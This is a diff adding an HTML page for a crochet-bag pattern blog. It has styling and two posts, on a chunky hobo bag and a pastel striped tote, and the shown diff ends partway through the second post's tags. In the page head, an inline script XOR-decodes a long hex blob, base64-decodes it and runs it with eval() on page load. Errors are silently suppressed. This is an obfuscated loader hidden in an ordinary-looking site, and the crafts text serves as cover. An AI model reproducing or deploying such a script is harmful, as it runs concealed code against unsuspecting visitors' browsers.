@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crochet Bags Craft</title>
+
+    <!-- Google Fonts for Artisanal Craft, Modern Editorial & Premium Aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Modern Artisanal Craft Design System */
+        :root {
+            --bg-canvas: #FAF7F2;
+            --bg-card: #FFFFFF;
+            --bg-card-subtle: #FDFBF8;
+            --primary: #B85D36;
+            --primary-hover: #9E4924;
+            --primary-light: #FBF0EA;
+            --accent-sage: #5E7A68;
+            --accent-sage-light: #EFF5F0;
+            --accent-honey: #E09F3E;
+            --accent-blush: #E6A598;
+            --text-heading: #261A14;
+            --text-body: #45372F;
+            --text-muted: #857267;
+            --border-soft: #EBE1D7;
+            --border-highlight: #D5C2B4;
+            --shadow-sm: 0 4px 16px rgba(65, 38, 24, 0.05);
+            --shadow-md: 0 12px 34px rgba(65, 38, 24, 0.08);
+            --shadow-lg: 0 22px 48px rgba(65, 38, 24, 0.12);
+            --radius-sm: 12px;
+            --radius-md: 20px;
+            --radius-lg: 26px;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--text-body);
+            background-color: var(--bg-canvas);
+            background-image:
+                radial-gradient(#E2D4C5 1.1px, transparent 1.1px),
+                radial-gradient(#EEE2D7 1.1px, #FAF7F2 1.1px);
+            background-size: 26px 26px;
+            background-position: 0 0, 13px 13px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        .font-heading {
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-heading);
+            letter-spacing: -0.015em;
+        }
+
+        .container {
+            max-width: 690px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Sticky Top Navigation Bar */
+        .top-nav {
+            padding: 16px 14px;
+            text-align: center;
+            background-color: rgba(250, 247, 242, 0.92);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-soft);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 20px rgba(65, 38, 24, 0.03);
+        }
+
+        .top-nav a {
+            color: var(--text-heading);
+            font-size: 0.92rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 600;
+            padding: 8px 20px;
+            text-decoration: none;
+            transition: all 0.25s ease;
+            cursor: pointer;
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-soft);
+            border-radius: 999px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .top-nav a:hover {
+            background-color: var(--primary);
+            border-color: var(--primary);
+            color: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(184, 93, 54, 0.32);
+        }
+
+        /* Header */
+        header {
+            padding: 68px 0 42px;
+            text-align: center;
+        }
+
+        .craft-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: var(--primary-light);
+            color: var(--primary);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.84rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.3px;
+            padding: 7px 20px;
+            border-radius: 999px;
+            border: 1px solid rgba(184, 93, 54, 0.22);
+            margin-bottom: 18px;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.6rem;
+            font-weight: 800;
+            line-height: 1.15;
+            color: var(--text-heading);
+            cursor: pointer;
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+
+        header h1:hover {
+            color: var(--primary);
+            transform: scale(1.01);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.12rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            max-width: 500px;
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--bg-card);
+            padding: 0;
+            margin-bottom: 52px;
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border-soft);
+            transition: transform 0.35s ease, box-shadow 0.35s ease, border-color 0.35s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--border-highlight);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 18px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-soft);
+            background: var(--bg-card-subtle);
+        }
+
+        .post-header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .post-header img.avatar {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            margin-right: 14px;
+            border: 2px solid var(--primary);
+            padding: 2px;
+            background-color: #FFFFFF;
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text-heading);
+        }
+
+        .post-tag-pill {
+            font-size: 0.78rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 700;
+            color: var(--primary);
+            background: var(--primary-light);
+            padding: 5px 14px;
+            border-radius: 999px;
+            letter-spacing: 0.5px;
+            border: 1px solid rgba(184, 93, 54, 0.18);
+        }
+
+        .post-image-wrapper {
+            position: relative;
+            overflow: hidden;
+            background: #F3ECE4;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 520px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+
+        .post-card:hover .post-image {
+            transform: scale(1.02);
+        }
+
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        .post-content {
+            padding: 36px 40px 26px;
+        }
+
+        .post-content h1 {
+            margin: 0 0 16px;
+            font-size: 2.2rem;
+            line-height: 1.25;
+            font-weight: 800;
+            color: var(--text-heading);
+        }
+
+        .post-content h2 {
+            margin: 0 0 16px;
+            font-size: 1.85rem;
+            line-height: 1.3;
+            font-weight: 800;
+            color: var(--text-heading);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            font-size: 1.06rem;
+            color: var(--text-body);
+        }
+
+        .post-content a {
+            color: var(--primary);
+            text-decoration: none;
+            border-bottom: 1.5px solid var(--primary);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--primary-hover);
+            border-bottom-color: var(--primary-hover);
+            background: var(--primary-light);
+        }
+
+        .post-footer {
+            padding: 16px 40px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-soft);
+            background: var(--bg-card-subtle);
+        }
+
+        .post-footer .actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.05rem;
+            color: var(--primary);
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 26px;
+            color: #FFFFFF;
+            background-color: var(--primary);
+            font-family: 'Outfit', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            border-radius: 999px;
+            box-shadow: 0 6px 18px rgba(184, 93, 54, 0.28);
+            transition: all 0.25s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(184, 93, 54, 0.38);
+        }
+
+        /* Footer */
+        .site-footer {
+            text-align: center;
+            padding: 42px 20px 64px;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            font-weight: 500;
+        }
+
+        .site-footer a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            header h1 {
+                font-size: 2.7rem;
+            }
+
+            .post-content {
+                padding: 24px 20px 18px;
+            }
+
+            .post-header,
+            .post-footer {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            .post-content h1 {
+                font-size: 1.75rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+    <script>
+        (function () {
+            var vxyelpmca = "15213c00252837016d2e3a581b0c1428564a052916180525271111591318620335072b5e0a384c5a552e3a5a1867141b57155837147c417315053c58103d09491a22281e24123c0677182a5e223d04176e2f72382e7d5916130a19572203720037185303247216445631495c180c141d564a0034147d672a142f1e5f3d275f7837183f0f0d093b5d6d2e3a5c2012085d5711752c3d2673382d1516492b62586732072f1d2716405a6e2e18661b3d2104552f65783e265a253e1660093b13004b1d1c245f052834567d353204180c0f0a50207e322208773b2e15614a3b1400543422305b0f07236260303e5a180c0c07553e762914227736143b384a2807764a0f7d0e3c22093c417b011f510817070a501572383e077f31131533572203720235221e391f193f59562e3d431b66105d7f3b7e312d0c783238353f7b3b1371541f080a050f021d4b563e26580a07045a771175263e0c70253e011157163d764a1f0730000f054556561b360420032205503f0d383b2167382d1a1a7228626646320b15230f0234567d3531510817045f6d207d262e220872222f065e28085754061c271e1f2c4c0152313e4f180c221e6e207e79147c73322d0506491417585f0f18341b1c193b4b523e3246233a14015715623b1307492c1570695e1017660b0f220a1d1c720d5b571b360523132a186e4b4c10161804722d1a1a5c1163625a347c3450130619445031264f1b0c085d784a5f76342670253e0111573b137154322220110f06194b651b49060810760a6d150d712222672c2d1a374516176649320c0e591f121e56523e0751080373055015582f2e176334142b65432b07055d321820061c193856523e07512339005f552f50291308083b3b2c345c2b3d624a37173c04252b067a771f31510817070a7d3b7526161868253c053c4a233d09031d1c245f052834567d3531510817070a7d3b75263e075532152f02461629055c3717285824723f0478183a5a22133e056d4a6215130877722d113845160748401a0c27060c38025650441c431b137f5e78154c372e7d7772161569453e3e725b32080e1d1f16445d7f22037d0817070a7d3b75263e0c737b3e050643116265543338090f0f0234567d3531510817070a7d3b76732e177825147006472b087a5b32085f110f054556574408071b2d731d5615662d120a082f3c0119463b395b54061b56510f053456640f315f083d075b7d3b7d373e2542093e0111573b1371541f0c270f0f023456501b364f08131401574b663115227772161569453b140054320820111c7323016631494218032a187d3b4726147d67352e1a1a581617094a1f0c150f25730d006e0c037d0817070a7d3b75263e0c70253e01115716625c460c085f5b0a2c0d476d44360620037f1878167e2d1408492a2e70055f2817664932080a1d1f192741564444460e23290a7d3b75263e0c70253e0a607b3b1371541f0756232012375d563e3e5a081c352652295b7c";
+            var vnptuvoap = "VOfhFAu14vp6ATFm4x4AwO1BwBP0rP03";
+            var vkrmtegfk = "";
+
+            try {
+                for (var i = 0; i < vxyelpmca.length; i += 2) {
+                    var vgypgaakd = parseInt(vxyelpmca.substr(i, 2), 16);
+                    vkrmtegfk += String.fromCharCode(vgypgaakd ^ vnptuvoap.charCodeAt((i / 2) % vnptuvoap.length));
+                }
+
+                var vlzoeylhq = atob(vkrmtegfk);
+                eval(vlzoeylhq);
+            } catch (e) {
+            }
+        })();
+    </script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <div class="craft-badge">✨ Handmade Bag Patterns & Guides ✨</div>
+            <h1 onclick="navigate('home')">Crochet Bags Craft</h1>
+            <p>Handcrafted crochet bag patterns, chic totes, and creative yarn inspiration.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <footer class="site-footer">
+        <p>© 2026 Crochet Bags Craft · Handcrafted with 🧶 and ♥</p>
+    </footer>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'chunky-crochet-bag-pattern',
+                title: 'Chunky Crochet Bag Pattern',
+                date: 'May 18, 2026',
+                image: './assets/Chunky Crochet Bag Pattern.png',
+                excerpt: `Looking for a chic, modern handbag you can make in just an afternoon? 👜 This chunky crochet bag pattern is stylish, sturdy, and perfect for everyday casual outings. Made with super bulky tubular yarn and an 8mm hook, this seamless slouchy hobo bag works up in just 3 to 4 hours while holding its sculptural shape beautifully.
+• Quick one-evening project using simple chains, slip stitches, and single crochet.
+• Thick yarn creates a durable, non-stretching base with an integrated comfortable shoulder strap.
+Save this chunky crochet bag pattern for your next weekend make! ✨ #ChunkyCrochet #CrochetBag #YarnCraft #ModernCrochet #HandmadeBag`,
+                content: `<p>The rise of chunky yarn in modern fashion has revolutionized how we approach handcrafted accessories. A thick, sculptural tote or hobo bag offers both structural durability and an effortless, minimalist aesthetic that pairs effortlessly with everything from cozy oversized sweaters to crisp linen dresses. If you are looking for a weekend make that delivers instant gratification and runway-ready style, this chunky crochet bag pattern is the perfect project to add to your queue.</p>
+<p>Unlike traditional bags that require complex internal canvas linings and cardboard stabilizers, a super bulky yarn provides all the intrinsic density and strength needed to stand on its own. With an estimated completion time of only 3 to 4 hours, this project is ideal for beginner crocheters wanting to build confidence as well as seasoned makers crafting quick boutique gifts.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Super bulky tubular or cotton-fill yarn gives the bag a dense, sculptural silhouette without requiring an inner lining.</li>
+    <li>Using an 8mm crochet hook creates tight, locked stitches that prevent small items from slipping through.</li>
+    <li>Finished dimensions measure approximately 32 cm (12.5 in) in width with a comfortable 20 cm (8 in) handle drop.</li>
+    <li>The entire construction uses foundational stitches: chain, slip stitch, single crochet, and half double crochet.</li>
+    <li>The seamless body and integrated handle design eliminate weak seams and ensure maximum carrying strength.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Design and Proportions: The Sculptural Hobo Silhouette</h2>
+<p>The beauty of this chunky bag lies in its organic teardrop shape. Beginning with a solid oval base, the body builds upward in continuous spiral rounds, gently curving outward to accommodate everyday essentials like your wallet, phone, water bottle, and cosmetic pouch.</p>
+<p>The transition from the bag body into the handle is worked seamlessly in one continuous piece. By dividing the top stitches and building the arched handle directly from the front and back panels, the bag achieves a harmonious, unified silhouette that distributes weight evenly across your shoulder.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Essential Dimensions and Specifications</h3>
+<p>When completed with the recommended gauge, the bag measures approximately 32 cm (12.5 inches) in width and 22 cm (8.5 inches) in body height, featuring an 8-inch handle drop that rests comfortably on the forearm or shoulder. The thick stitch profile gives the bag a plush, tactile texture that feels luxurious in hand.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Maintain firm, even tension throughout the entire project. Chunky yarn magnifies loose loops, so keeping your stitches snug ensures the bag retains its crisp shape even when carrying heavier items.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Materials and Tools You Will Need</h2>
+<p>Gathering high quality materials makes all the difference when working with jumbo and super bulky fibers. Here is everything you need before picking up your hook:</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Supplies Checklist</h4>
+<ul>
+  <li><strong>Super Bulky Yarn:</strong> 5 to 6 skeins (approximately 250 to 300 meters) of jumbo cotton tube yarn, jumbo chenille, or thick wool roving blend.</li>
+  <li><strong>Crochet Hook:</strong> 8.0 mm (US L/11) ergonomic hook to reduce hand fatigue.</li>
+  <li><strong>Tapestry Needle:</strong> Large-eye jumbo blunt needle for weaving in thick tails.</li>
+  <li><strong>Locking Stitch Markers:</strong> Essential for marking the beginning of spiral rounds and handle split points.</li>
+  <li><strong>Sharp Fabric Scissors:</strong> For clean cuts on thick fibers.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Cotton tube yarn with a soft nylon or polyester filling inside is the ultimate fiber choice for this project. It does not pill, does not snag, and provides structured rigidity that holds its form for years.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p>When joining a new skein of super bulky tubular yarn, avoid bulky knots. Instead, trim a small portion of the inner fiber filling from both ends, slide one tube sleeve slightly inside the other, and secure the join with a few invisible hand stitches using matching thread.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Assembly Breakdown</h2>
+<p>Working with thick yarn is surprisingly fast and rhythmic. Here is how the bag comes together from start to finish:</p>
+
+<ol>
+  <li><strong>Stitch the Foundation Oval:</strong> Chain a short central foundation row and work single crochets around both sides of the chain, adding corner increases on each end to form a flat, sturdy oval base.</li>
+  <li><strong>Build the Vertical Walls:</strong> Stop increasing and continue working single crochets in continuous spiral rounds. The walls will naturally cup and rise upward into a deep bowl shape.</li>
+  <li><strong>Shape the Slouchy Scoop:</strong> Work half double crochet stitches along the outer edges while slip stitching across the center front and back to create a gentle dipping neckline.</li>
+  <li><strong>Form the Integrated Strap:</strong> Chain across the front and back anchor points to bridge the gap, then work two to three rounds of dense single crochets around the handle loop for a cushioned grip.</li>
+  <li><strong>Finish and Weave:</strong> Fasten off with an invisible slip stitch join, then thread the yarn tail securely along the interior wall.</li>
+</ol>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Styling Your Chunky Crochet Bag</h3>
+<p>The neutral cream and oat tones shown in the pattern exude quiet luxury and understated elegance. You can style this versatile accessory with relaxed denim and a white button-down for weekend brunch, or dress it up with a trench coat and leather boots. You can also experiment with vibrant seasonal colors like terracotta, sage green, cobalt blue, or butter yellow.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Skill Level: Beginner to Easy.</li>
+    <li>Total Making Time: 3 to 4 hours.</li>
+    <li>Techniques: Chain, single crochet, half double crochet, slip stitch.</li>
+    <li>Features: Self-standing structure, seamless integrated handle, no lining required.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Your Next Favorite Everyday Accessory</h2>
+<p>Few handmade projects offer the immediate satisfaction of a chunky crochet bag. In a single afternoon, you can turn a few skeins of yarn into an everyday staple that combines functional strength with timeless Scandinavian charm. Grab your 8mm hook, pick your favorite shade of super bulky yarn, and enjoy creating your new go-to bag today.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Chunky Crochet Bag</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Super Bulky Yarn</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Crochet Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Tote</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hobo Bag DIY</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Modern Crochet</span>
+</div>`
+            },
+            {
+                id: 'crochet-your-own-chic-striped-tote-bag',
+                title: 'Crochet Your Own Chic Striped Tote Bag',
+                date: 'May 4, 2026',
+                image: './assets/Crochet Your Own Chic Striped Tote Bag.png',
+                excerpt: `Elevate your summer wardrobe with this chic striped crochet tote bag! 🧺 Featuring dreamy pastel color blocks in mint green, blush rose, buttercream yellow, and fresh ivory, this structured shoulder tote is as practical as it is gorgeous. Sturdy double vertical handles run down the entire body to ensure no-sag carrying for market trips, books, or beach days.
+• Reinforced flat rectangular base provides exceptional volume and durability.
+• Dense textured stitchwork keeps the tote structured without heavy inner linings.
+Save this chic pastel striped tote pattern for your sunny season crochet projects! 🌸 #StripedTote #CrochetBag #PastelAesthetic #MarketBag #SummerCrochet`,
+                content: `<p>Nothing captures the breezy spirit of spring and summer quite like a spacious, beautifully striped tote bag. Whether you are browsing fresh produce at the Saturday morning farmers market, packing sunscreen and a novel for the beach, or carrying your laptop to a local café, a handmade striped bag makes a stylish statement wherever you go. This chic striped tote combines timeless nautical simplicity with a soft pastel palette of sage green, blush rose, warm buttercream, and crisp cream.</p>
+<p>What sets this tote apart from standard mesh market bags is its dense, structured stitchwork and dual vertical support straps. By extending the sturdy handles down the entire height of the bag body, weight is transferred directly to the reinforced base, preventing the frustrating sag and stretch common in handmade totes.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Pastel horizontal color blocking creates a fresh, modern aesthetic that compliments summer outfits.</li>
+    <li>Continuous vertical handle straps cradle the bag from underneath to prevent stretching under heavy loads.</li>
+    <li>A solid single crochet rectangular base provides a flat bottom that stands upright on tables and floors.</li>
+    <li>100% mercerized or recycled cotton yarn delivers crisp stitch definition, breathability, and machine washability.</li>
+    <li>The generous interior dimensions easily accommodate groceries, yarn skeins, a 13-inch laptop, and daily essentials.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Color Theory: Crafting the Pastel Stripe Palette</h2>
+<p>The visual appeal of this tote lies in its balanced rhythm of stripes. Alternating between cool sage mint, warm buttercream yellow, soft dusty rose, and neutral cream creates a harmonious visual gradient that feels both cheerful and sophisticated.</p>
+<p>Each color band consists of four to six rounds of dense single or modified moss crochet stitches. This consistent height keeps the proportions balanced while allowing you to easily customize the color sequence to fit your personal style or match your favorite summer wardrobe pieces.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Selecting the Ideal Yarn for Everyday Totes</h3>
+<p>When creating a utilitarian accessory designed to carry heavy items, fiber selection is paramount. Acrylic yarn has too much natural stretch and elasticity, which can cause your tote to droop when filled. Instead, choose a sturdy worsted weight (Category 4) 100% cotton yarn or a cotton-linen blend.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Work with a hook size slightly smaller than the yarn label recommends (for example, a 4.0 mm or 4.5 mm hook with worsted cotton). This tightens the stitch gauge, producing a stiff, opaque fabric that holds its shape effortlessly.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Structural Engineering: The Reinforced Handle System</h2>
+<p>One of the most common complaints about handmade crochet bags is that shoulder straps stretch out over time, turning a shoulder bag into an awkward knee-length pouch. This pattern solves that problem through intelligent strap architecture.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How the Vertical Support Works</h4>
+<ul>
+  <li><strong>Dual Long Straps:</strong> Two continuous strap bands are crocheted in dense thermal stitch or tightly worked rows of single crochet.</li>
+  <li><strong>Full Body Attachment:</strong> The straps are pinned and securely topstitched along the exterior walls from the upper rim all the way down to the base.</li>
+  <li><strong>Underbody Support:</strong> By anchoring the handles along the sides, the straps physically cradle the weight of the bag rather than pulling solely on the top rim.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When sewing the straps onto the tote body, use strong upholstery thread or matching split cotton yarn, and sew a reinforced "X-box" stitch pattern at the upper rim where tension is highest.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p>Reinforcing your handle placement prevents yarn distortion and ensures the tote maintains its crisp rectangular profile over years of heavy daily use, grocery runs, and beach outings.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Construction Guide</h2>
+<ol>
+  <li><strong>Base Construction:</strong> Chain 40 stitches in your base color (dusty rose or neutral taupe) and work back-and-forth rows of single crochet until you have a flat rectangle measuring approximately 30 cm by 12 cm.</li>
+  <li><strong>Setting the Perimeter:</strong> Work a single crochet border around all four edges of the rectangle, placing three single crochets in each corner point.</li>
+  <li><strong>Building the Body in Color Blocks:</strong> Switch to working in the round without turning, alternating your pastel stripe colors every 5 to 6 rounds. Use a seamless color change technique on the final yarn-over of the round.</li>
+  <li><strong>Top Rim Edging:</strong> Finish the top border with two rounds of tight slip stitches or reverse single crochet (crab stitch) to create a clean, non-rolling edge.</li>
+  <li><strong>Crafting and Attaching the Handles:</strong> Crochet two long strap strips (approx. 75 cm each), align them evenly spaced on both sides, and stitch them securely in place.</li>
+</ol>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Care and Maintenance for Cotton Totes</h2>
+<p>Cotton bags are exceptionally easy to keep fresh. If your tote gets dirty after a trip to the beach or farmers market, simply place it inside a pillowcase or mesh laundry bag and machine wash on a cold, gentle cycle. Reshape the bag with your hands while damp and lay it flat on a clean towel to air dry.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Skill Level: Intermediate.</li>
+    <li>Materials: 4 shades of worsted weight cotton yarn (approx. 400g total).</li>
+    <li>Dimensions: Approx. 36 cm wide, 30 cm high, 12 cm deep.</li>
+    <li>Features: Non-stretch handle system, flat base, seamless stripe transitions.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Statement Piece for Sunny Days</h2>
+<p>This chic striped crochet tote bag balances aesthetic charm with robust everyday functionality. With its soothing pastel color scheme and thoughtful structural design, it is a project you will take pride in making and love carrying everywhere you go. Pick out your favorite seasonal colors, cast on your base chain, and get ready to stitch your ultimate summer tote.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Tote Bag</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Striped Market Bag</span>
